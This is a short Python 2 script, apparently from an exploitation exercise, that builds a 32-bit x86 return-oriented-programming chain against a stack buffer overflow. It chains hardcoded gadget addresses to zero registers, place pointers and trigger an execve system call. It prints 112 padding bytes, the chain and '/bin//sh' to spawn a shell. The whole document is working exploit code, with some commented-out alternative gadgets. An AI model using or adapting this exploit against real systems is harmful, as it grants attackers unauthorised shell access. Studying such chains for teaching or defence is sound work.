from struct import pack

gadget_chain = ''
ebp_addr = 0xbffeeb38
nul_addr = ebp_addr + 56
sh_addr = ebp_addr + 60
# xor %eax, %eax
gadget_chain += pack("<I", 0x08051750)

# pop %edx
gadget_chain += pack("<I", 0x0805733a)
# nul address
gadget_chain += pack("<I", nul_addr)

# mov %eax, (%edx)
gadget_chain += pack("<I", 0x0808e97d)	# mov %eax, (%edx); pop %ebx - 0x08080866

# add %eax, $4; pop %edi
gadget_chain += pack("<I", 0x0807c75f)
# fill-up
gadget_chain += pack("<I", 0x41414141)
# add %eax, $7; pop %edi
gadget_chain += pack("<I", 0x0807c3bb)
# pop %ebx
gadget_chain += pack("<I", 0x41414141)

# gadget_chain += pack("<I", 0x080481ec)
# 0x0b0b0b0b
# gadget_chain += pack("<I", 0x0b0b0b0b)
# add %bh, %al
# gadget_chain += pack("<I", 0x0808f68d)

# pop %edx; pop %ecx; pop %ebx
gadget_chain += pack("<I", 0x08057360)
# nul address
gadget_chain += pack("<I", nul_addr)
gadget_chain += pack("<I", nul_addr)
# "/bin/sh\0" address
gadget_chain += pack("<I", sh_addr)

# int $0x80
gadget_chain += pack("<I", 0x080494f9)
 
print 'A' * 112 + gadget_chain + 'AAAA' + '/bin//sh'
